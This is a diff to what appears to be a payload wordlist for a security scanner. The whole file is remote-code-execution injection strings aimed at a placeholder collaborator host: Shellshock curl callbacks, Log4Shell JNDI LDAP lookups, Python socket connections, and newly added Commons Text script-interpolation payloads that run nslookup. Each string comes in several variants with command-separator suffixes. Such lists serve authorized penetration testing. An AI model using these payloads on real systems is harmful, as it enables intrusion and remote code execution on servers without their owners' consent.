@@ -117,20 +117,20 @@ ping !-VARIABLE_COLLABORATOR-!#
 () { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt;
 () { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt%00
 () { :;}; /bin/bash -c "curl !-VARIABLE_COLLABORATOR-!/shellshock_curl.txt#
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}&&
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}|
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}||
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a};
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}%00
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!/a}#
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}&&
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}|
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}||
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a};
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}%00
-${jndi:ldap://!-VARIABLE_COLLABORATOR-!:80/a}#
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!/a}&
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!/a}&&
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!/a}|
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!/a}||
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!/a};
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!/a}%00
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!/a}#
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!:80/a}&
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!:80/a}&&
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!:80/a}|
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!:80/a}||
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!:80/a};
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!:80/a}%00
+${jndi:ldap://!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!:80/a}#
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'&&
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'|
@@ -138,6 +138,8 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLAB
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")';
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'%00
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")'#
+%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27!-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!%27%29%7d
+${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup !-VARIABLE_COLLABORATOR_WITHOUT_HTTP-!')}
 import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&
 import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")&&
 import os,pty,socket;s=socket.socket();s.connect(("!-VARIABLE_COLLABORATOR-!",80));s.send(b"python_rce")|
